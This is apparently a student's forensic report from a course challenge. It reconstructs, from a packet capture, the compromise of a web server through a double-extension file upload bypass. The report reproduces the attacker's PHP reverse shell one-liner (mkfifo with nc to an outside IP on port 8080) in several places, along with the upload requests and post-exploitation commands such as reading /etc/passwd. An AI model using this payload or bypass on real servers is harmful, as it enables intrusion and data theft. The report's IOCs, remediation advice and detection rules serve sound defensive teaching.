# Web Server Compromise via Unrestricted File Upload

## DataSecure Inc & shoporoma.com Forensic Investigation


## 1. Engagement Overview

A forensic investigation was conducted on a provided PCAP file capturing a confirmed web server compromise affecting `shoporoma.com`, a banking portal
hosted by DataSecure Inc. The incident occurred on **30 November 2023, between
approximately 18:43 and 18:44 UTC**, based on timestamps extracted from captured
HTTP responses. The attack originated from IP `117.11.88.124` (CN, China) and
involved the exploitation of an unrestricted file upload vulnerability in the
customer reviews feature, resulting in PHP web shell installation, reverse shell
establishment, and exfiltration of `/etc/passwd`. Analysis was performed on Kali
Linux using Wireshark, NetworkMiner, WHOIS, and GeoIP. The PCAP contained
100% malicious traffic, capturing only communications between the attacker and
the target server.

---

## 2. Objectives

- Identify the attacker's IP address and geographic origin from PCAP traffic
- Determine the specific vulnerability exploited and the endpoint targeted
- Reconstruct the full attack sequence from reconnaissance through data
  exfiltration
- Extract and document the complete web shell upload request from the TCP stream
- Identify obfuscation techniques used to bypass server-side upload validation
- Document all network-based and host-based Indicators of Compromise
- Provide actionable preventive and detective recommendations

---

## 3. Scope

**In-Scope:**
- Provided PCAP file (`c116-WebStrike.pcap`) capturing traffic between
  attacker IP `117.11.88.124` and the `shoporoma.com` web server
- Web application endpoint: `http://shoporoma.com/reviews/upload.php`
- Reverse shell traffic on TCP port 8080
- Extracted web shell artifact: `image.jpg.php`

**Out-of-Scope:**
- Internal network traffic beyond the web server
- Database server traffic
- Any live system access or active exploitation

**Authorization Statement:**
> This investigation was conducted on a pre-captured PCAP file provided as part
> of a course case study challenge. No live systems were accessed or exploited
> at any point. All analysis was performed in a controlled Kali Linux environment
> for educational purposes under authorized course instruction.

---

## 4. Methodology

### Phase 1: Traffic Overview and IP Identification
Wireshark was opened with the provided PCAP. The filter `ip.addr == 117.11.88.124`
was applied to isolate all traffic involving the attacker's address. Conversation
statistics were reviewed to confirm the attacker communicated exclusively with the
target server. `geoiplookup 117.11.88.124` and `whois 117.11.88.124` were run from
the terminal to retrieve geographic origin and ASN registration data.

### Phase 2: HTTP Traffic Analysis
The filter `http.request.method == "POST"` was applied to isolate upload
requests. TCP streams were followed for each POST to reconstruct full request
and response pairs, including headers, form fields, file content, and server
responses.

### Phase 3: Web Shell Extraction and Hashing
NetworkMiner was used to automatically reassemble the uploaded file from the
PCAP. The extracted `image.jpg.php` was located in the Files tab. MD5, SHA-1,
and SHA-256 hashes were computed from the extracted artifact for use as IOCs.

### Phase 4: Reverse Shell and Post-Exploitation Analysis
The filter `tcp.port == 8080` was applied to isolate the outbound reverse shell
connection. The TCP stream was followed to reconstruct the interactive shell
session and identify all commands executed by the attacker after gaining access.

### Phase 5: Attack Reconstruction and Documentation
The full attack sequence was reconstructed by correlating packet timestamps,
HTTP request/response pairs, and TCP stream content. All IOCs were documented
and recommendations were developed based on the confirmed attack vectors.

---

## 5. Vulnerability Summary

| ID | Vulnerability | Severity | Affected Endpoint |
|----|--------------|----------|-------------------|
| 01 | Unrestricted File Upload -- Double Extension Bypass | Critical | /reviews/upload.php |
| 02 | Web Shell Remote Code Execution | Critical | /reviews/image.jpg.php |
| 03 | Outbound Reverse Shell -- No Egress Filtering | Critical | TCP Port 8080 |
| 04 | Data Exfiltration via Interactive Shell | High | /etc/passwd |
| 05 | Verbose Server Version Disclosure | Medium | HTTP Response Headers |

---

## 6. Detailed Findings

---

### Finding 01: Unrestricted File Upload via Double Extension Bypass

#### Severity
Critical

#### Affected Endpoint
`http://shoporoma.com/reviews/upload.php` POST, `uploadedFile` field

#### Description
The reviews feature on `shoporoma.com` accepts file uploads via a
`multipart/form-data` POST request. The server's first-pass validation rejected
a file named `image.php` with the response "Invalid file format," indicating
some form of extension checking was present. However, the validation logic did
not account for files with double extensions. When the attacker resubmitted the
same PHP payload under the filename `image.jpg.php`, the server accepted it and
returned "File uploaded successfully." The server evaluated only the first
extension (`.jpg`) and treated the file as an image without inspecting the
actual content or the terminal extension (`.php`).

#### Proof of Concept

First upload attempt rejected: filename `image.php`:



![Wireshark TCP Stream - First Upload Rejected with Invalid file format](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/05_01%20Wireshark%20TCP%20Stream%20-%20First%20Upload%20Rejected%20with%20Invalid%20file%20format.jpg)



Failed upload POST request extracted from TCP stream:
```

Content-Disposition: form-data; name="uploadedFile"; filename="image.php"
Content-Type: application/x-php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc
117.11.88.124 8080 >/tmp/f"); ?>

HTTP/1.1 200 OK
...
Invalid file format.
```

Second upload attempt succeeded, filename `image.jpg.php` with fake form
fields used to mimic a legitimate review submission:



![Wireshark TCP Stream - Second Upload Accepted with File uploaded successfully](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/05_02%20Wireshark%20TCP%20Stream%20-%20Second%20Upload%20Accepted%20with%20File%20uploaded%20successfully.jpg)



Complete upload POST request from TCP stream analysis:
```
POST /reviews/upload.php HTTP/1.1
Host: shoporoma.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------26176590812480906864292095114
Content-Length: 687
Origin: http://shoporoma.com
Connection: keep-alive
Referer: http://shoporoma.com/reviews/
Upgrade-Insecure-Requests: 1

-----------------------------26176590812480906864292095114
Content-Disposition: form-data; name="name"
asd
-----------------------------26176590812480906864292095114
Content-Disposition: form-data; name="email"
asd@asd.com
-----------------------------26176590812480906864292095114
Content-Disposition: form-data; name="review"
asd
-----------------------------26176590812480906864292095114
Content-Disposition: form-data; name="uploadedFile"; filename="image.jpg.php"
Content-Type: application/x-php

<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc
117.11.88.124 8080 >/tmp/f"); ?>

HTTP/1.1 200 OK
Date: Thu, 30 Nov 2023 18:44:19 GMT
Server: Apache/2.4.52 (Ubuntu)
...
File uploaded successfully
```

#### Impact
The uploaded PHP file was stored in a web-accessible directory
(`/var/www/html/reviews/uploads/`) with PHP execution enabled. Any HTTP GET
request to the file's URL triggered the PHP payload, initiating a reverse shell
back to the attacker. The file persists on the server until actively removed,
providing the attacker with reusable access regardless of whether the upload
vulnerability is patched after the fact.

#### Remediation
- Reject any filename containing more than one extension at the server layer:
  if the filename after the last dot is an executable type, reject the upload
  regardless of what precedes it
- Validate file content using magic byte inspection with PHP's `finfo_file()`
  rather than evaluating the filename or client-supplied `Content-Type` header
- Rename all uploaded files server-side to a randomly generated string with
  a forced safe extension before storing them, removing the original filename
  from the stored path entirely
- Disable PHP execution in the upload directory:
```

php_flag engine off
Options -ExecCGI
```

---

### Finding 02: Web Shell Remote Code Execution

#### Severity
Critical

#### Affected Endpoint
`http://shoporoma.com/reviews/image.jpg.php`

#### Description
The uploaded file `image.jpg.php` contained a PHP reverse shell one-liner. When
the attacker triggered the file via HTTP GET, the PHP interpreter executed the
payload, which created a named pipe (`/tmp/f`), attached a shell to it, and
piped the shell's input and output through a Netcat connection back to
`117.11.88.124` on port `8080`. The web server process initiated the outbound
connection, bypassing inbound firewall rules. The attacker received a fully
interactive shell session running as the `www-data` user.

#### Proof of Concept

Reverse shell payload extracted from the uploaded file:

Payload content:
```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc
117.11.88.124 8080 >/tmp/f"); ?>
```

Outbound TCP connection to port 8080 captured in Wireshark:


![Wireshark Filter tcp.port == 8080 - Outbound Reverse Shell Connection](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/05_03%20Wireshark%20Filter%20tcp.port%20%3D%3D%208080%20-%20Outbound%20Reverse%20Shell%20Connection.jpg)



Interactive shell session content reconstructed from TCP stream:
```
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ uname -a
Linux ubuntu-virtual-machine 6.2.0-37-generic #38~22.04.2 18:01:13 UTC 2
x86_64 x86_64 x86_64 GNU/Linux
$ pwd
/var/www/html/reviews/uploads
$ ls /home
ubuntu
$ cat /etc/passwd
```

#### Impact
An interactive shell session running as `www-data` gives the attacker read
access to all files readable by the web server process, the ability to browse
the application source code and database configuration files for credentials,
and a pivot point for further network reconnaissance. The `cat /etc/passwd`
command confirmed active exfiltration of local user account information from
the server.

#### Remediation
- Removing the uploaded shell immediately after detection is the first
  required step. The file path `shoporoma.com/reviews/image.jpg.php` must
  be deleted and the directory audited for any other files uploaded during
  the same window.
- Deploy File Integrity Monitoring (FIM) using OSSEC or Tripwire to detect
  new file creation in web directories and alert on files matching the
  known IOC hashes
- Implement egress filtering on the web server to block outbound TCP
  connections to non-whitelisted addresses and ports, which would have
  prevented the reverse shell from completing even after the file was uploaded

---

### Finding 03: No Egress Network Filtering on Web Server

#### Severity
Critical

#### Affected Component
Web server network configuration: outbound TCP port 8080

#### Description
The web server permitted an unrestricted outbound TCP connection from the
PHP process to `117.11.88.124:8080`. The reverse shell payload relied entirely
on this outbound connection being allowed. If egress filtering had been
configured to permit only necessary outbound traffic (e.g., DNS, NTP, defined
API endpoints), the connection attempt would have been blocked at the network
layer and the reverse shell would not have established, even with the file
successfully uploaded.

#### Proof of Concept

Wireshark conversation showing the outbound TCP connection from the server to
the attacker on port 8080, establishing the interactive shell session:



![GeoIP lookup](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/05_05%20GeoIP%20lookup%20confirming%20the%20attacker's%20IP%20location.jpg)



GeoIP lookup confirming the attacker's IP location:

```
geoiplookup 117.11.88.124
GeoIP Country Edition: CN, China
```

#### Impact
Without egress filtering, any code execution on the web server can establish
arbitrary outbound connections to attacker-controlled infrastructure on any
port. This is the standard mechanism for reverse shells, data exfiltration,
and command-and-control channels. The outbound direction specifically bypasses
inbound firewall rules, which most organizations prioritize over egress controls.

#### Remediation
- Configure a host-based firewall (e.g., `iptables` or `ufw`) on the web
  server to restrict outbound traffic to explicitly permitted destinations
  and ports only
- Block all outbound connections from the Apache/PHP process account
  (`www-data`) except those required for application functionality
- Monitor outbound connection logs for connections to non-standard ports
  or unexpected external IP addresses

---

### Finding 04: /etc/passwd Exfiltration via Reverse Shell

#### Severity
High

#### Affected Component
Server filesystem: `/etc/passwd`

#### Description
After establishing the reverse shell session, the attacker ran a sequence of
post-exploitation commands: `whoami`, `uname -a`, `pwd`, `ls /home`, and
`cat /etc/passwd`. The `cat /etc/passwd` command transmitted the contents of
the server's local user account file through the reverse shell connection back
to the attacker. The `/etc/passwd` file contains the list of all local system
accounts, their UIDs, GIDs, home directories, and shell assignments. The server
was running as `ubuntu-virtual-machine` with a single local user account
(`ubuntu`) visible in the `/home` directory listing.

#### Proof of Concept

TCP stream reconstructing post-exploitation commands run by the attacker:

![Wireshark TCP Stream - Post-Exploitation Commands Including cat /etc/passwd](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/05_04%20Wireshark%20TCP%20Stream%20-%20Post-Exploitation%20Commands%20Including%20cat%2C%20etc%2C%20and%20passwd.jpg)



Commands run in sequence during the session:
```
whoami       -> www-data
uname -a     -> Linux ubuntu-virtual-machine 6.2.0-37-generic
pwd          -> /var/www/html/reviews/uploads
ls /home     -> ubuntu
cat /etc/passwd
```

#### Impact
The `/etc/passwd` file lists all local accounts including service accounts used
by the application. If any of those accounts use weak passwords and password
authentication is enabled on the server, the attacker has a starting point for
offline password attacks. On a banking portal server, the `ubuntu` user account
is likely used for administrative SSH access, making it a high-value target for
privilege escalation.

#### Remediation
- Implement mandatory access control policies (AppArmor or SELinux) to
  prevent the `www-data` process from reading files outside the web root
  and designated log directories
- Disable password-based SSH authentication and require key-based
  authentication only, reducing the value of local account information to
  an attacker
- Treat the server as fully compromised and conduct a complete credential
  rotation for all accounts that existed on the system at the time of the
  incident

---

### Finding 05: Server Version Disclosure via HTTP Response Headers

#### Severity
Medium

#### Affected Component
HTTP response headers: all responses from `shoporoma.com`

#### Description
Every HTTP response from the server included the `Server` header identifying
the exact Apache version in use: `Apache/2.4.52 (Ubuntu)`. This was visible
in both the upload response and the reverse shell session output from `uname -a`.
Apache 2.4.52 was released in December 2021 and has known CVEs available
in public vulnerability databases.

#### Proof of Concept

Server header observed in the upload response:
```
HTTP/1.1 200 OK
Date: Thu, 30 Nov 2023 18:44:19 GMT
Server: Apache/2.4.52 (Ubuntu)
```

#### Impact
Knowing the exact Apache version allows an attacker to query the NVD or
Exploit-DB for version-specific vulnerabilities without any active fingerprinting
effort. This is passive reconnaissance that costs nothing but reading the response.

#### Remediation
- Set `ServerTokens Prod` and `ServerSignature Off` in the Apache
  configuration to suppress version disclosure in all response headers
- Update Apache from 2.4.52 to the current supported release

---

## 7. Attack Chain

![Attack Chain](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/05_06%20Attack%20Chain.jpg)
---

## 8. Tools Used

- Kali Linux (investigation environment)
- Wireshark (PCAP analysis, TCP stream reconstruction, HTTP filtering)
- NetworkMiner (automated file extraction and hash computation)
- `geoiplookup` (attacker IP geographic origin)
- `whois` (ASN and registration data for attacker IP)

---

## 9. Indicators of Compromise (IOCs)

**Network-Based IOCs**

| Indicator | Value | Description |
|-----------|-------|-------------|
| Attacker IP | `117.11.88.124` | Source of all malicious traffic |
| Geographic Origin | CN, China | GeoIP result for attacker IP |
| User-Agent | `Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0` | Attacker browser fingerprint |
| Vulnerable Endpoint | `/reviews/upload.php` | POST target for shell upload |
| Web Shell URL | `http://shoporoma.com/reviews/image.jpg.php` | Uploaded shell access path |
| C2 Port | TCP 8080 | Outbound reverse shell port |
| HTTP Method | POST | Method used during exploitation |

**Host-Based IOCs**

| Indicator | Value | Description |
|-----------|-------|-------------|
| Malicious Filename | `image.jpg.php` | Double extension web shell |
| File Path on Server | `/var/www/html/reviews/uploads/image.jpg.php` | Stored shell location |
| MD5 Hash | `c2338c275563602b3fd8ba54dd5f3d80` | Web shell file hash |
| SHA-1 Hash | `509e0972e4518637d16e471a6de3010a21290308` | Web shell file hash |
| SHA-256 Hash | `7d499e9f90ea91854d6e237bcf1f4a2236ad6fcdfec894635656757b541baa58` | Web shell file hash |
| Shell Payload | `<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 117.11.88.124 8080 >/tmp/f"); ?>` | Reverse shell content |
| Server Version | `Apache/2.4.52 (Ubuntu)` | Web server version from response headers |

---

## 10. Challenges Encountered

- **Single-extension filter gave false confidence:** The first upload was blocked
  because the server checked whether the terminal extension was `.php`. The
  double extension bypass succeeded because the validation logic evaluated the
  first extension rather than the last, or checked only whether `.jpg` appeared
  anywhere in the filename. This is a pattern seen frequently in real-world upload
  filters built without considering double extension filenames.
- **100% malicious PCAP limited traffic context:** Because the PCAP captured
  only traffic between the attacker and the server, there was no baseline of
  normal traffic to compare against. All observations were made from malicious
  traffic alone, which simplified timeline reconstruction but made it impossible
  to assess whether any prior reconnaissance activity occurred outside the
  capture window.

---

## 11. Key Takeaways

- **Double extensions are a well-known bypass technique that basic filters miss:**
  Any filter that checks whether the filename contains `.jpg` without also
  confirming that the terminal extension is not executable will fail against
  `filename.jpg.php`. Validation must evaluate the last extension, not
  the first or the presence of a safe extension anywhere in the string.
- **Egress filtering would have stopped the attack at the reverse shell stage:**
  The file upload vulnerability provided the initial foothold, but the attack
  only caused damage because the server was allowed to make outbound
  connections to arbitrary IP addresses on arbitrary ports. An egress rule
  blocking outbound TCP on port 8080 to non-whitelisted addresses would have
  prevented the shell from establishing, limiting the impact to a stored but
  non-executed file.
- **The first failed upload is a detectable signal:** The server returned "Invalid
  file format" in response to `image.php` and then "File uploaded successfully"
  seconds later for `image.jpg.php`. A SIEM rule that alerts on a failed upload
  immediately followed by a successful upload from the same source IP within a
  short window would have flagged this attack before the shell was triggered.
- **File Integrity Monitoring on upload directories closes the post-upload
  detection gap:** Regardless of what validation the application performs, FIM
  configured to alert on new PHP files appearing in `/reviews/uploads/` would
  catch any shell regardless of the bypass technique used, since the common
  outcome of all bypass methods is the same: a PHP file ends up in the upload
  directory.
- **Obfuscation through fake form fields highlights the need for behavioral
  analysis:** The attacker populated the name, email, and review fields with
  dummy values to make the request look structurally legitimate. Simple
  content-type blocking would not distinguish this request from a real user
  submission. Inspecting the actual file content for PHP openers (`<?php`) in
  any uploaded file, regardless of the declared type, would catch this approach.

---

## 12. Recommendations

**Preventive Controls**

Implement strict server-side file upload validation that checks the actual file
content using magic bytes via PHP's `finfo_file()` rather than evaluating the
filename string or client-supplied headers. Reject any file whose terminal
extension is an executable type regardless of what precedes it. Store uploaded
files outside the web root or with PHP execution explicitly disabled in the
storage directory. Deploy a Web Application Firewall configured to block
multipart POST requests containing PHP function signatures such as `<?php`,
`system(`, or `exec(` in the uploaded file body.

**Detective Controls**

Enable comprehensive Apache access and error logging with User-Agent capture
and forward logs to a SIEM. Create an alert rule for the pattern: failed upload
from an IP followed by a successful upload from the same IP within a short
window. Deploy File Integrity Monitoring (OSSEC or Tripwire) on all upload
directories to alert on new file creation, particularly files with executable
extensions. Configure network monitoring to alert on outbound connections from
the web server process to non-whitelisted external IPs, particularly on
non-standard ports such as 8080.

---

## 13. Disclaimer

> This investigation was conducted exclusively on a pre-captured PCAP file
> (`c116-WebStrike.pcap`) provided as part of a case study challenge for the
> course Kali Linux Tools and System Security at ICDFA. No live systems were
> accessed, exploited, or disrupted at any point during this investigation. All
> findings are based solely on evidence present in the provided capture file.
> All techniques and indicators documented in this report are presented for
> educational and defensive awareness purposes only.
